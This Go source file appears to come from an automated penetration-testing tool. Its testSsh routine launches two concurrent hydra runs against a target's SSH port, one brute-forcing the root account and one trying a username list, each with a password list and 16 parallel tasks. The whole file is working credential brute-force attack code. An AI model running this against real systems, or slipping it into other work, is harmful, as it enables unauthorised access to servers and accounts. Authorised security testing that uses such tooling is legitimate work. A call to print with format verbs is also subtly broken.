package main

import (
	"fmt"
	"sync"

	str "strings"
)

func (t *targetT) testSsh(port int, portInfo portInfoT) {
	print("testing %s on port %d...\n", portInfo.service, port)

	sshWg := &sync.WaitGroup{}

	sshWg.Add(2)
	go t.sshBruteRoot(port, sshWg)
	go t.sshBruteUser(port, sshWg)
	sshWg.Wait()

	t.wg.Done()
}

func (t *targetT) sshBruteRoot(port int, wg *sync.WaitGroup) {
	var c cmdT
	c.name = "ssh_brute_root"
	c.bin = "hydra"

	argsS := fmt.Sprintf("-l root -P %s -I -u ssh://%s:%d -t 16",
		"./data/ssh_root_pass", t.host, port)

	c.args = str.Split(argsS, " ")

	runCmd(t.host, &c)
	wg.Done()
}

func (t *targetT) sshBruteUser(port int, wg *sync.WaitGroup) {
	var c cmdT
	c.name = "ssh_brute_user"
	c.bin = "hydra"

	argsS := fmt.Sprintf("-L %s -P %s -I -u ssh://%s:%d -t 16",
		"./data/ssh_user", "./data/ssh_user_pass", t.host, port)

	c.args = str.Split(argsS, " ")

	runCmd(t.host, &c)
	wg.Done()
}
